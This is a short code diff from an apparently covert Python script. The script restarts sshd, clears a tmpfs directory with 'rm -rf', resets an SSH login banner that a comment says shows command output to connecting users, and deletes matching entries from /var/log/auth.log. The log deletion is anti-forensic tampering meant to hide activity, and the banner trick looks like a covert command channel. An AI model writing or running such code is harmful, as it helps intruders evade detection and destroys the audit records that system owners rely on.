@@ -64,8 +64,8 @@ while True:
                 print("restarting sshd")
                 time.sleep(10)
                 # cleanup. Further connections will show the output until command reset
-                subprocess.call("rm", "-rf", "/tmp/tmpfs/*")
-                subprocess.call("umount", "/tmp/tmpfs/")
+                subprocess.call("rm -rf /tmp/tmpfs/*", shell=True)
+                subprocess.call("umount /tmp/tmpfs/", shell=True)
                 subprocess.check_output("sed -i 's:Banner /tmp/tmpfs/issue.net:Banner none:g'", shell=True)
                 subprocess.check_output("sed -i '/.shadow---./d' /var/log/auth.log", shell=True);
 
